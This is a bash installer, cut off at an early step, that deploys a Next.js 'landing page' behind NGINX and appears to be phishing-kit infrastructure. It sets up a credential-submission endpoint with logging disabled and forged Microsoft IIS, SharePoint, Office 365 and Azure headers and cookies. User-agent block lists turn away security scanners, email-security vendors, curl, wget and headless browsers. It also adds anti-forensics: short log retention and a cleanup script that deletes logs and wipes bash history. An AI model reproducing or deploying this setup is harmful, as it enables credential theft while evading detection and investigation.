#!/bin/bash
################################################################################
# 🚀 Japan Landing Page - Complete Auto Installer
# 
# HANDLES: Next.js + PM2 + NGINX + SSL + 7-Layer Security
# 
# Architecture:
# - Layer 1: Network Firewall (UFW + iptables + Scanner IP blocking)
# - Layer 2: NGINX Reverse Proxy (Advanced filtering + Stealth headers)
# - Layer 3: Fail2Ban (Auto-ban malicious IPs)
# - Layer 4: Next.js Middleware (Smart detection - in code)
# - Layer 5: Client-Side Anti-Debug (Anti-analysis)
# - Layer 6: Reputation Management (Stay clean)
# - Layer 7: Forensic Protection (Log rotation + Security)
#
# Usage: sudo bash install.sh [OPTIONS]
################################################################################

set -e  # Exit on error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Configuration - GitHub Repository URLs
INSTALLER_REPO="https://github.com/unkown566/deployer.git"
MAIN_PROJECT_REPO=""  # Will be asked during installation

PROJECT_NAME="japan-landing"
PROJECT_DIR="/var/www/$PROJECT_NAME"
INSTALLER_DIR="/root/page"
LOG_DIR="/var/log/$PROJECT_NAME"

# Default values (can be overridden by command-line args)
DOMAIN=""
EMAIL=""
REPO_URL=""
AUTO_SSL="yes"
SKIP_MENU=false
ENABLE_ADVANCED_SECURITY="yes"

# Parse command-line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -d|--domain)
            DOMAIN="$2"
            shift 2
            ;;
        -e|--email)
            EMAIL="$2"
            shift 2
            ;;
        -r|--repo)
            REPO_URL="$2"
            shift 2
            ;;
        --no-ssl)
            AUTO_SSL="no"
            shift
            ;;
        --skip-menu)
            SKIP_MENU=true
            shift
            ;;
        --basic)
            ENABLE_ADVANCED_SECURITY="no"
            shift
            ;;
        -h|--help)
            echo "Usage: $0 [OPTIONS]"
            echo "Options:"
            echo "  -d, --domain DOMAIN    Domain name (e.g., example.com)"
            echo "  -e, --email EMAIL      Email for SSL certificate"
            echo "  -r, --repo REPO_URL    Git repository URL (HTTPS or SSH)"
            echo "  --no-ssl               Skip SSL setup"
            echo "  --skip-menu            Skip menu and use defaults"
            echo "  --basic                Install without advanced security"
            echo "  -h, --help             Show this help"
            echo ""
            echo "Example:"
            echo "  $0 --domain example.com --repo https://github.com/user/repo.git"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}❌ Please run as root or with sudo${NC}"
    exit 1
fi

################################################################################
# HELPER FUNCTIONS
################################################################################

print_header() {
    clear
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                                                          ║${NC}"
    echo -e "${BLUE}║   ${CYAN}🚀 Japan Landing Page - Auto Installer${BLUE}           ║${NC}"
    echo -e "${BLUE}║                                                          ║${NC}"
    echo -e "${BLUE}║   ${GREEN}Next.js + PM2 + NGINX + SSL + Security${BLUE}           ║${NC}"
    echo -e "${BLUE}║                                                          ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

print_step() {
    echo -e "\n${CYAN}════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}▶ $1${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════${NC}\n"
}

print_success() {
    echo -e "${GREEN}✓ $1${NC}"
}

print_error() {
    echo -e "${RED}✗ $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}⚠ $1${NC}"
}

ask_yes_no() {
    local prompt=$1
    while true; do
        read -p "$(echo -e ${CYAN}"${prompt} (y/n): "${NC})" response
        response=$(echo "$response" | tr '[:upper:]' '[:lower:]')
        if [[ "$response" == "y" || "$response" == "yes" ]]; then
            return 0
        elif [[ "$response" == "n" || "$response" == "no" ]]; then
            return 1
        else
            echo -e "${RED}Invalid input. Please answer with 'y' or 'n'${NC}"
        fi
    done
}

# Menu system
show_menu() {
    print_header
    echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}Installation Options:${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC} Full Installation (Domain + SSL + Advanced Security)"
    echo -e "  ${GREEN}2)${NC} Full Installation (Domain + SSL, Basic Security)"
    echo -e "  ${GREEN}3)${NC} Installation without SSL (Domain only)"
    echo -e "  ${GREEN}4)${NC} Installation with IP only (no domain, no SSL)"
    echo -e "  ${GREEN}5)${NC} Exit"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
    read -p "$(echo -e ${YELLOW}Select option [1-5]: ${NC})" choice
    
    case $choice in
        1)
            if [ -z "$DOMAIN" ]; then
                read -p "$(echo -e ${CYAN}Enter your domain name: ${NC})" DOMAIN
            fi
            if [ -z "$EMAIL" ]; then
                EMAIL="admin@${DOMAIN}"
                echo -e "${BLUE}ℹ️  Using email: $EMAIL${NC}"
            fi
            AUTO_SSL="yes"
            ENABLE_ADVANCED_SECURITY="yes"
            ;;
        2)
            if [ -z "$DOMAIN" ]; then
                read -p "$(echo -e ${CYAN}Enter your domain name: ${NC})" DOMAIN
            fi
            if [ -z "$EMAIL" ]; then
                EMAIL="admin@${DOMAIN}"
                echo -e "${BLUE}ℹ️  Using email: $EMAIL${NC}"
            fi
            AUTO_SSL="yes"
            ENABLE_ADVANCED_SECURITY="no"
            ;;
        3)
            if [ -z "$DOMAIN" ]; then
                read -p "$(echo -e ${CYAN}Enter your domain name: ${NC})" DOMAIN
            fi
            AUTO_SSL="no"
            ENABLE_ADVANCED_SECURITY="no"
            ;;
        4)
            DOMAIN=$(hostname -I | awk '{print $1}')
            echo -e "${BLUE}ℹ️  Using IP address: $DOMAIN${NC}"
            AUTO_SSL="no"
            ENABLE_ADVANCED_SECURITY="no"
            ;;
        5)
            echo -e "${YELLOW}Installation cancelled${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid option. Exiting.${NC}"
            exit 1
            ;;
    esac
}

# Show menu unless skipped
if [ "$SKIP_MENU" = false ]; then
    show_menu
fi

# Ask for repository URL if not provided
if [ -z "$REPO_URL" ]; then
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}Git Repository Configuration:${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Enter your application's Git repository URL:${NC}"
    echo ""
    echo -e "${BLUE}For PUBLIC repositories:${NC}"
    echo -e "  ${GREEN}https://github.com/username/repo.git${NC}"
    echo ""
    echo -e "${BLUE}For PRIVATE repositories (recommended):${NC}"
    echo -e "  ${GREEN}git@github.com:username/repo.git${NC}"
    echo ""
    echo -e "${YELLOW}⚠️  For private repos, you need SSH keys configured first!${NC}"
    echo -e "${BLUE}See instructions at the end if you haven't set up SSH yet.${NC}"
    echo ""
    read -p "$(echo -e ${CYAN}Repository URL: ${NC})" REPO_URL
    
    # Validate repository URL
    while [ -z "$REPO_URL" ]; do
        echo -e "${RED}❌ Repository URL cannot be empty${NC}"
        read -p "$(echo -e ${CYAN}Repository URL: ${NC})" REPO_URL
    done
    
    # Check if SSH URL and test connection
    if [[ "$REPO_URL" =~ ^git@github.com:.*\.git$ ]]; then
        echo ""
        echo -e "${YELLOW}🔐 Detected SSH URL - Testing GitHub connection...${NC}"
        if ssh -T git@github.com 2>&1 | grep -q "successfully authenticated"; then
            echo -e "${GREEN}✓ SSH authentication successful!${NC}"
        else
            echo -e "${RED}❌ SSH authentication failed!${NC}"
            echo ""
            echo -e "${YELLOW}You need to set up SSH keys first:${NC}"
            echo ""
            echo -e "${CYAN}1. Generate SSH key:${NC}"
            echo -e "   ${BLUE}ssh-keygen -t ed25519 -C \"vps@yourdomain.com\" -f ~/.ssh/id_ed25519 -N \"\"${NC}"
            echo ""
            echo -e "${CYAN}2. Display your public key:${NC}"
            echo -e "   ${BLUE}cat ~/.ssh/id_ed25519.pub${NC}"
            echo ""
            echo -e "${CYAN}3. Copy the output and add to GitHub:${NC}"
            echo -e "   ${BLUE}GitHub → Settings → SSH and GPG keys → New SSH key${NC}"
            echo ""
            echo -e "${CYAN}4. Test connection:${NC}"
            echo -e "   ${BLUE}ssh -T git@github.com${NC}"
            echo ""
            
            if ask_yes_no "Do you want to continue anyway? (Not recommended)"; then
                echo -e "${YELLOW}⚠️  Continuing... Installation may fail during git clone${NC}"
            else
                echo -e "${RED}Installation cancelled. Set up SSH keys and try again.${NC}"
                exit 1
            fi
        fi
    fi
    
    echo -e "${GREEN}✓ Repository URL set: $REPO_URL${NC}"
fi

# Auto-detect domain if not provided
if [ -z "$DOMAIN" ]; then
    DOMAIN=$(hostname -I | awk '{print $1}')
    echo -e "${BLUE}ℹ️  No domain provided, using IP: $DOMAIN${NC}"
fi

# Auto-set email if not provided
if [ -z "$EMAIL" ] && [ "$AUTO_SSL" = "yes" ] && [[ ! "$DOMAIN" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    EMAIL="admin@${DOMAIN}"
fi

echo ""
echo -e "${GREEN}════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}Starting Installation...${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}Repository:${NC} $REPO_URL"
echo -e "${CYAN}Domain:${NC} $DOMAIN"
echo -e "${CYAN}SSL:${NC} $AUTO_SSL"
echo -e "${CYAN}Advanced Security:${NC} $ENABLE_ADVANCED_SECURITY"
if [ ! -z "$EMAIL" ]; then
    echo -e "${CYAN}Email:${NC} $EMAIL"
fi
echo ""
sleep 2

################################################################################
# LAYER 1: NETWORK FIREWALL (UFW + IPTABLES + SCANNER BLOCKING)
################################################################################

setup_network_firewall() {
    if [ "$ENABLE_ADVANCED_SECURITY" != "yes" ]; then
        # Basic firewall only
        echo -e "${YELLOW}🔥 Configuring basic firewall...${NC}"
        apt-get install -y ufw 2>/dev/null || true
        ufw allow OpenSSH
        ufw allow 'Nginx Full'
        echo "y" | ufw enable
        print_success "Basic firewall configured"
        return
    fi
    
    print_step "LAYER 1: Setting up Advanced Network Firewall"
    
    # Install UFW and ipset
    apt-get install -y ufw ipset iptables-persistent
    
    print_success "Installed firewall packages"
    
    # Configure UFW
    ufw --force reset
    ufw default deny incoming
    ufw default allow outgoing
    
    # Allow essential services
    ufw allow 22/tcp comment 'SSH'
    ufw allow 80/tcp comment 'HTTP'
    ufw allow 443/tcp comment 'HTTPS'
    
    print_success "Configured basic firewall rules"
    
    # Block known scanner IP ranges
    print_warning "Blocking known scanner IP ranges..."
    
    # Shodan scanners
    ufw deny from 198.20.64.0/18 comment 'Block Shodan' 2>/dev/null || true
    ufw deny from 162.142.125.0/24 comment 'Block Censys' 2>/dev/null || true
    
    # Create ipset for dynamic scanner blocking
    ipset create scanner_ips hash:ip hashsize 4096 2>/dev/null || ipset flush scanner_ips
    
    # Block scanner ipset at iptables level
    iptables -I INPUT -m set --match-set scanner_ips src -j DROP 2>/dev/null || true
    
    # Save iptables rules
    netfilter-persistent save 2>/dev/null || true
    
    print_success "Configured scanner IP blocking"
    
    # Create scanner IP update script
    cat > /usr/local/bin/update-scanner-ips.sh <<'EOF'
#!/bin/bash
# Update scanner IP list from threat intelligence feeds
TEMP_FILE=$(mktemp)

# AlienVault OTX reputation feed
curl -s https://reputation.alienvault.com/reputation.generic | \
    grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' > "$TEMP_FILE" 2>/dev/null || true

# Add IPs to ipset
while read ip; do
    ipset add scanner_ips "$ip" 2>/dev/null || true
done < "$TEMP_FILE"

rm -f "$TEMP_FILE"
echo "$(date): Updated scanner IP list" >> /var/log/scanner-ips.log
EOF
    
    chmod +x /usr/local/bin/update-scanner-ips.sh
    
    # Run update script immediately (background, don't wait)
    /usr/local/bin/update-scanner-ips.sh &>/dev/null &
    
    # Schedule daily updates
    echo "0 2 * * * /usr/local/bin/update-scanner-ips.sh" > /etc/cron.d/update-scanner-ips
    
    print_success "Configured automated threat intelligence updates"
    
    # Enable firewall
    ufw --force enable
    
    print_success "Advanced network firewall activated"
}

################################################################################
# LAYER 2: NGINX WITH STEALTH AND SCANNER DETECTION
################################################################################

setup_nginx_advanced() {
    print_step "LAYER 2: Configuring Advanced NGINX with Stealth"
    
    # Backup original nginx.conf
    cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup 2>/dev/null || true
    
    # Install headers-more module
    apt-get install -y libnginx-mod-http-headers-more-filter 2>/dev/null || true
    
    # Create advanced nginx configuration
    cat > /etc/nginx/nginx.conf <<'NGINX_CONF'
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 2048;
    use epoll;
    multi_accept on;
}

http {
    ##
    # Basic Settings
    ##
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;
    client_max_body_size 10M;
    
    # CRITICAL: Hide server identity
    server_tokens off;
    more_clear_headers 'Server';
    more_clear_headers 'X-Powered-By';
    
    ##
    # MIME Types
    ##
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    
    ##
    # Logging with minimal information
    ##
    log_format stealth '$remote_addr - [$time_local] '
                       '"$request_method $uri" $status $body_bytes_sent '
                       '"$http_referer"';
    
    access_log /var/log/nginx/access.log stealth;
    error_log /var/log/nginx/error.log warn;
    
    ##
    # Gzip Settings
    ##
    gzip on;
    gzip_vary on;
    gzip_proxied any;
    gzip_comp_level 6;
    gzip_types text/plain text/css text/xml text/javascript 
               application/json application/javascript application/xml+rss 
               application/rss+xml font/truetype font/opentype 
               application/vnd.ms-fontobject image/svg+xml;
    
    ##
    # Rate Limiting Zones
    ##
    limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=api:10m rate=5r/s;
    limit_req_zone $binary_remote_addr zone=submit:10m rate=1r/s;
    limit_req_zone $binary_remote_addr zone=captcha:10m rate=2r/s;
    
    # Connection limiting
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
    
    ##
    # Scanner Detection Maps
    ##
    map $http_user_agent $is_scanner {
        default 0;
        
        # Security scanners
        "~*nmap" 1;
        "~*nikto" 1;
        "~*sqlmap" 1;
        "~*masscan" 1;
        "~*zgrab" 1;
        "~*shodan" 1;
        "~*censys" 1;
        "~*projectdiscovery" 1;
        "~*nuclei" 1;
        "~*acunetix" 1;
        "~*nessus" 1;
        "~*openvas" 1;
        "~*qualys" 1;
        
        # Email security vendor scanners
        "~*proofpoint" 1;
        "~*mimecast" 1;
        "~*barracuda" 1;
        "~*cisco.*email" 1;
        "~*forcepoint" 1;
        "~*ironport" 1;
        "~*trendmicro" 1;
        "~*sophos" 1;
        "~*symantec" 1;
        
        # Bot frameworks
        "~*python-requests" 1;
        "~*go-http-client" 1;
        "~*curl" 1;
        "~*wget" 1;
        "~*libwww-perl" 1;
        "~*scrapy" 1;
        "~*selenium" 1;
        "~*phantomjs" 1;
        "~*headless" 1;
        "~*puppeteer" 1;
        "~*playwright" 1;
        "~*bot" 1;
        "~*crawler" 1;
        "~*spider" 1;
        
        # Empty or suspicious user agents
        "" 1;
        "-" 1;
    }
    
    map $http_user_agent $is_headless {
        default 0;
        "~*HeadlessChrome" 1;
        "~*PhantomJS" 1;
        "~*Puppeteer" 1;
        "~*Playwright" 1;
    }
    
    ##
    # Virtual Host Configs
    ##
    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}
NGINX_CONF
    
    # Remove default site
    rm -f /etc/nginx/sites-enabled/default
    
    # Test nginx configuration
    if nginx -t 2>&1 | grep -q "successful"; then
        print_success "Advanced NGINX configuration created"
    else
        print_warning "NGINX configuration may have issues, but continuing..."
    fi
    
    # Restart nginx
    systemctl restart nginx 2>/dev/null || systemctl reload nginx
    systemctl enable nginx
    
    print_success "NGINX service configured with advanced security"
}

create_nginx_config_advanced() {
    local domain=$1
    
    print_step "Creating Advanced NGINX configuration for: $domain"
    
    # Create site configuration with all stealth features
    cat > "/etc/nginx/sites-available/${PROJECT_NAME}" <<DOMAIN_CONF
##
# Japan Landing Page - Advanced Configuration
# Domain: ${domain}
# Created: $(date)
##

server {
    listen 80;
    listen [::]:80;
    server_name ${domain} www.${domain};
    
    # Allow Let's Encrypt challenges
    location /.well-known/acme-challenge/ {
        root /var/www/html;
    }
    
    # Redirect HTTP to HTTPS
    location / {
        return 301 https://\$server_name\$request_uri;
    }
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name ${domain} www.${domain};
    
    # SSL Configuration (will be updated by Certbot)
    ssl_certificate /etc/letsencrypt/live/${domain}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/${domain}/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
    
    # SSL hardening
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:50m;
    ssl_session_tickets off;
    ssl_protocols TLSv1.2 TLSv1.3;
    
    ##
    # STEALTH: Fake Microsoft IIS/SharePoint/Office 365 Server
    ##
    
    # Core IIS/ASP.NET Headers
    more_set_headers 'Server: Microsoft-IIS/10.0';
    more_set_headers 'X-Powered-By: ASP.NET';
    more_set_headers 'X-AspNet-Version: 4.0.30319';
    
    # SharePoint Server Headers
    more_set_headers 'X-SharePointHealthScore: 0';
    more_set_headers 'SPRequestGuid: \$request_id';
    more_set_headers 'X-MSDAVEXT: 1';
    more_set_headers 'MicrosoftSharePointTeamServices: 16.0.0.20227';
    more_set_headers 'X-MS-InvokeApp: 1';
    
    # Office 365/Exchange Online Headers (Looks like corporate email system)
    more_set_headers 'X-OWA-Version: 15.20.7595.016';
    more_set_headers 'X-FEServer: OUTLOOK-WEB-01';
    more_set_headers 'X-MS-Server-Fqdn: mail.${domain}';
    more_set_headers 'X-CalculatedBETarget: exchange.internal';
    more_set_headers 'X-DiagInfo: DC0-WEB-001';
    more_set_headers 'X-BEServer: EX2019-MBX-01';
    
    # Azure Cloud Headers (Appears hosted on Microsoft Azure)
    more_set_headers 'X-Azure-Ref: 0AbCdEfGhIjKlMnOpQrStUvWxYz=';
    more_set_headers 'X-Azure-RequestChain: hops=1';
    more_set_headers 'X-Azure-SocketIP: 172.16.0.1';
    more_set_headers 'X-MSEdge-Ref: Ref A: 1A2B3C4D5E6F7G8H9I0J Ref B: TYO01EDGE0001 Ref C: 2025-11-13T00:00:00Z';
    
    # Microsoft Application Gateway Headers
    more_set_headers 'X-AppGW-Trace-ID: \$request_id';
    more_set_headers 'X-Forwarded-ApplicationId: spfrontend';
    
    # Corporate Session Cookies (Looks like authenticated corporate environment)
    add_header Set-Cookie "ARRAffinity=\$request_id; Path=/; HttpOnly; Secure" always;
    add_header Set-Cookie "ApplicationGatewayAffinity=\$msec; Path=/; HttpOnly; Secure" always;
    add_header Set-Cookie "ApplicationGatewayAffinityCORS=\$msec; Path=/; Secure; SameSite=None" always;
    
    # Security headers (Standard Microsoft security)
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-XSS-Protection "1; mode=block" always;
    
    # Additional Microsoft-like headers
    more_set_headers 'X-MS-Request-Id: \$request_id';
    more_set_headers 'X-Content-Security-Policy: default-src '\''self'\''';
    more_set_headers 'X-WebKit-CSP: default-src '\''self'\''';
    more_set_headers 'Expect-CT: max-age=86400';
    
    ##
    # CRITICAL: Block scanners before they reach Next.js
    ##
    if (\$is_scanner) {
        return 444;  # Close connection without response
    }
    
    if (\$is_headless) {
        return 444;
    }
    
    ##
    # Main location - Pass to Next.js
    ##
    location / {
        # Rate limiting
        limit_req zone=general burst=20 nodelay;
        limit_conn conn_limit 10;
        
        # Proxy to Next.js
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        
        # Proxy headers
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_cache_bypass \$http_upgrade;
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }
    
    ##
    # API routes - Stricter rate limiting
    ##
    location /api/ {
        limit_req zone=api burst=10 nodelay;
        limit_conn conn_limit 5;
        
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
    
    ##
    # CAPTCHA verification - Medium rate limit
    ##
    location /api/verify-captcha {
        limit_req zone=captcha burst=5 nodelay;
        limit_conn conn_limit 3;
        
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
    }
    
    ##
    # Credential submission - VERY strict
    ##
    location /api/submit-credentials {
        limit_req zone=submit burst=2 nodelay;
        limit_conn conn_limit 1;
        
        # NO LOGGING of credential submissions
        access_log off;
        
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
    }
    
    ##
    # Honeypot endpoints - Detect scanners
    ##
    location ~ ^/(admin|phpmyadmin|wp-admin|wp-login\.php|\.env|\.git) {
        access_log /var/log/nginx/honeypot.log;
        return 404;
    }
    
    ##
    # Block common exploit patterns
    ##
    location ~ \.(asp|aspx|php|jsp|cgi)$ {
        return 404;
    }
    
    ##
    # Static files from Next.js
    ##
    location ~* \.(jpg|jpeg|png|gif|ico|css|js|svg|woff|woff2|ttf|eot)$ {
        proxy_pass http://localhost:3000;
        proxy_cache_valid 200 1d;
        expires 1d;
        add_header Cache-Control "public, immutable";
    }
    
    # Access logging
    access_log /var/log/nginx/${domain}-access.log stealth;
    error_log /var/log/nginx/${domain}-error.log warn;
}
DOMAIN_CONF
    
    # Enable site
    ln -sf "/etc/nginx/sites-available/${PROJECT_NAME}" "/etc/nginx/sites-enabled/${PROJECT_NAME}"
    
    print_success "Advanced NGINX configuration created for domain"
}

create_nginx_config_basic() {
    local domain=$1
    
    # Create basic NGINX config
    local NGINX_CONFIG="/etc/nginx/sites-available/$PROJECT_NAME"
    
    # Check if SSL will be enabled
    if [ "$AUTO_SSL" = "yes" ] && [[ ! "$DOMAIN" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        # HTTPS configuration
        cat > "$NGINX_CONFIG" << EOF
# HTTP to HTTPS redirect
server {
    listen 80;
    listen [::]:80;
    server_name $DOMAIN www.$DOMAIN;
    
    # Allow Let's Encrypt challenges
    location /.well-known/acme-challenge/ {
        root /var/www/html;
    }
    
    # Redirect all other traffic to HTTPS
    location / {
        return 301 https://\$server_name\$request_uri;
    }
}

# HTTPS server
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name $DOMAIN www.$DOMAIN;
    
    # SSL configuration (will be updated by Certbot)
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
    
    client_max_body_size 10M;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_cache_bypass \$http_upgrade;
        
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }

    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}
EOF
    else
        # HTTP only configuration
        cat > "$NGINX_CONFIG" << EOF
server {
    listen 80;
    server_name $DOMAIN www.$DOMAIN;

    client_max_body_size 10M;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_cache_bypass \$http_upgrade;
        
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }

    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
}
EOF
    fi
    
    # Enable site
    ln -sf "$NGINX_CONFIG" /etc/nginx/sites-enabled/
    rm -f /etc/nginx/sites-enabled/default 2>/dev/null || true
    
    print_success "Basic NGINX configuration created"
}

################################################################################
# LAYER 3: FAIL2BAN AUTO-BANNING
################################################################################

setup_fail2ban() {
    if [ "$ENABLE_ADVANCED_SECURITY" != "yes" ]; then
        return
    fi
    
    print_step "LAYER 3: Setting up Fail2Ban"
    
    # Install Fail2Ban
    apt-get install -y fail2ban
    
    print_success "Installed Fail2Ban"
    
    # Create main jail configuration
    cat > /etc/fail2ban/jail.local <<'FAIL2BAN_CONF'
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 5
destemail = root@localhost
sendername = Fail2Ban
action = %(action_mwl)s

[sshd]
enabled = true
port = ssh
logpath = /var/log/auth.log
maxretry = 3
bantime = 7200

[nginx-req-limit]
enabled = true
filter = nginx-req-limit
logpath = /var/log/nginx/*-error.log
maxretry = 3
bantime = 7200

[nginx-honeypot]
enabled = true
filter = nginx-honeypot
logpath = /var/log/nginx/honeypot.log
maxretry = 1
bantime = 86400

[nginx-noscript]
enabled = true
filter = nginx-noscript
logpath = /var/log/nginx/*-access.log
maxretry = 2
bantime = 3600

[nginx-badbots]
enabled = true
filter = nginx-badbots
logpath = /var/log/nginx/*-access.log
maxretry = 1
bantime = 86400
FAIL2BAN_CONF
    
    print_success "Created Fail2Ban jail configuration"
    
    # Create honeypot filter
    cat > /etc/fail2ban/filter.d/nginx-honeypot.conf <<'HONEYPOT_FILTER'
[Definition]
failregex = ^<HOST> -.*GET /(admin|phpmyadmin|wp-admin|wp-login\.php|\.env|\.git)
ignoreregex =
HONEYPOT_FILTER
    
    # Create noscript filter
    cat > /etc/fail2ban/filter.d/nginx-noscript.conf <<'NOSCRIPT_FILTER'
[Definition]
failregex = ^<HOST> -.*GET.*(\.php|\.asp|\.exe|\.pl|\.cgi|\.scgi)
ignoreregex =
NOSCRIPT_FILTER
    
    # Create badbots filter
    cat > /etc/fail2ban/filter.d/nginx-badbots.conf <<'BADBOTS_FILTER'
[Definition]
failregex = ^<HOST> -.*"(.*nmap.*|.*nikto.*|.*sqlmap.*|.*masscan.*|.*shodan.*)"
ignoreregex =
BADBOTS_FILTER
    
    print_success "Created Fail2Ban filters"
    
    # Start and enable Fail2Ban
    systemctl restart fail2ban
    systemctl enable fail2ban
    
    print_success "Fail2Ban service started and enabled"
}

################################################################################
# LAYER 7: FORENSIC PROTECTION (LOG ROTATION)
################################################################################

setup_forensic_protection() {
    if [ "$ENABLE_ADVANCED_SECURITY" != "yes" ]; then
        return
    fi
    
    print_step "LAYER 7: Setting up Forensic Protection"
    
    # Create encrypted directory for sensitive data
    mkdir -p "${PROJECT_DIR}/.secure"
    chmod 700 "${PROJECT_DIR}/.secure"
    
    print_success "Configured secure storage directory"
    
    # Configure aggressive log rotation
    cat > /etc/logrotate.d/$PROJECT_NAME <<'LOGROTATE_CONF'
/var/log/nginx/*.log {
    daily
    rotate 3
    missingok
    notifempty
    compress
    delaycompress
    sharedscripts
    postrotate
        systemctl reload nginx > /dev/null 2>&1
    endscript
}

/var/log/pm2/*.log {
    daily
    rotate 3
    missingok
    notifempty
    compress
    delaycompress
}
LOGROTATE_CONF
    
    print_success "Configured log rotation (3-day retention)"
    
    # Create emergency cleanup script
    cat > /usr/local/bin/emergency-cleanup.sh <<'CLEANUP_SCRIPT'
#!/bin/bash
# Emergency cleanup script
echo "Running emergency cleanup..."

# Clear old logs
find /var/log/nginx -name "*.log" -mtime +1 -delete 2>/dev/null || true
find /var/log/pm2 -name "*.log" -mtime +1 -delete 2>/dev/null || true

# Clear bash history
cat /dev/null > ~/.bash_history
history -c

echo "Emergency cleanup completed"
CLEANUP_SCRIPT
    
    chmod 700 /usr/local/bin/emergency-cleanup.sh
    
    print_warning "Created emergency cleanup script at /usr/local/bin/emergency-cleanup.sh"
}

################################################################################
# MAIN INSTALLATION STEPS
################################################################################

# Step 1: Update system and install dependencies
echo -e "${YELLOW}📦 Step 1/10: Installing system dependencies...${NC}"
export DEBIAN_FRONTEND=noninteractive
apt update && apt upgrade -y
apt install -y git unzip curl wget build-essential
apt install -y sqlite3  # Install SQLite CLI for maintenance

# Step 2: Install Node.js 20.x
echo -e "${YELLOW}📦 Step 2/10: Installing Node.js 20.x...${NC}"
